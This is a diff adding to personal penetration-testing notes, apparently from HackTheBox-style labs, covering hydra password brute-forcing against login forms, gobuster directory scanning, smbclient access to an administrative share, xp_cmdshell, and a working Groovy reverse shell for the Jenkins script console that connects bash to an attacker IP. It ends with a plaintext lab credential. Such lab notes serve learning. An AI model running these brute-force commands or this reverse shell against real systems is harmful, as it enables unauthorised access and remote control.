@@ -362,3 +362,70 @@ The presence of the robots.txt does not in itself present any kind of security v
 
 
 * We can convert Hex to ASCII using the command `xxd`
+
+
+
+
+## To Be re-written later  
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
+
+hydra -l admin -P /home/kali/mywordlist ignition.htb http-port-form "/admin?form_key=uCAJwNW5TywTQ3U8&login%5Busername%5D=^USER^&login%5Bpassword%5D=^PASS^"
+
+gobuster dir -u 10.129.159.48 -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt
+
+* If I need to exclude a status code because an error like this is encountered you can use the flag `-b` and then put the status codes you want to blacklist or `-s` and put the status codes you want to whitelist. Like this:  
+```
+gobuster dir -u http://10.129.159.48:8080/ -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt -b "403,404" 
+```
+
+
+* What does versions of software mean?   
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Semver.jpg/440px-Semver.jpg">  
+
+
+* Groovy Script   
+Groovy is a scripting language with Java-like syntax for the Java platform
+
+* XBruteForcer to bruteforce certain CRMs?
+
+* BruteX to bruteforce passwords.
+
+* Hydra example (Not sure of functionality just yet)   
+```
+$ hydra -l admin -P /home/kali/Documents/cloned_reps/SecLists/Passwords/2020-200_most_used_passwords.txt -vV -f -t 5 10.129.157.36 http-post-form "/\\login:j_username=^USER^&j_password=^PASS^:loginError"
+
+```
+
+* Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:
+
+```groovy
+String host="10.10.15.82";
+int port=1234;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+* What is SMB?  
+<blockquote>
+The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. It can also carry transaction protocols for interprocess communication. Over the years, SMB has been used primarily to connect Windows computers, although most other systems -- such as Linux and macOS -- also include client components for connecting to SMB resources.
+</blockquote>
+
+* How to use smbclient to view available shares:  
+```
+smbclient -L \\\\10.129.158.38 -U 'administrator'
+```
+
+* To access a share just remove the `-L` and specify the name of the share:  
+```
+smbclient \\\\10.129.158.38\\ADMIN$ -U 'administrator'
+```
+
+* The `$` means that this share is an administrative share.  
+
+* We can use the command `get` inside the smb prompt to download files on our own box.
+
+* `xp_cmdshell` allows me to spawn a Windows shell.
+
+Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
